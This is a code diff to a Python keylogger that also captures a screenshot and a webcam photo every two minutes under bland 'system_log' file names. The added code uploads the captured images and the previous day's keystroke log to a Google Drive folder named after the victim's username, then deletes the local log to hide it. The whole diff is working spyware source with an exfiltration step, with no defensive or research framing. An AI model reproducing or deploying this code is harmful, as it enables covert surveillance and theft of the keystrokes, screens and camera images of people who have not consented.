@@ -1,9 +1,22 @@
-from pynput import keyboard
-from datetime import datetime
-from pyautogui import screenshot
-import threading
-from cv2 import VideoCapture, imwrite
 
+from io import BytesIO
+import getpass
+from os import path, remove
+from PIL import ImageGrab
+from pynput import keyboard
+from datetime import datetime, timedelta
+import threading
+from cv2 import VideoCapture
+from googleDirveUtilities import upload_in_memory_image, get_or_create_folder, upload_text_file
+
+# Naming file with todays date
+file_name = "system_log" + datetime.now().strftime("%Y_%m_%d")
+
+# Open the log file in append mode
+log_file = open(file_name, "a")
+
+# Define the desired folder name
+FOLDER_NAME = getpass.getuser()
 
 def on_press(key):
     try:
@@ -36,7 +49,7 @@ def take_picture (imageName):
         raise Exception("Failed to capture image")
     
     # Save the image
-    imwrite(imageName, frame)
+    upload_in_memory_image(frame, imageName)
     
     # Release the camera
     cap.release()
@@ -47,7 +60,13 @@ def take_screenshot():
     filename = f"system_state_{timestamp}.png"
     imageName = f"system_image_{timestamp}.png"
     
-    screenshot(filename)
+    # Capture the screenshot
+    screenshot = ImageGrab.grab()
+    # Save it to a BytesIO object
+    screenshot_data = BytesIO()
+    screenshot.save(screenshot_data, format='PNG')
+    screenshot_data.seek(0)  # Reset the stream position
+    upload_in_memory_image(screenshot_data, imageName)
     try: 
         take_picture(imageName)
     except Exception as e:
@@ -60,16 +79,21 @@ def take_screenshot():
         threading.Timer(120, take_screenshot).start()
 
 
-# Naming file with todays date
-file_name = "system_log" + datetime.now().strftime("%Y_%m_%d")
-
-# Open the log file in append mode
-log_file = open(file_name, "a")
 
 # Log the start time
 start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 log_file.write(f'\nSession started at: {start_time}\n')
 log_file.flush()
+
+folder_id = get_or_create_folder(FOLDER_NAME)
+yesterday_file =  "system_log" + (datetime.now() - timedelta(days=1)).strftime("%Y_%m_%d")
+try:
+    if  path.exists(yesterday_file):
+        upload_text_file(yesterday_file, yesterday_file, folder_id)
+        remove(yesterday_file)
+except Exception as e:
+    print(f"Error: {e}")
+
 
 try:
     take_screenshot()
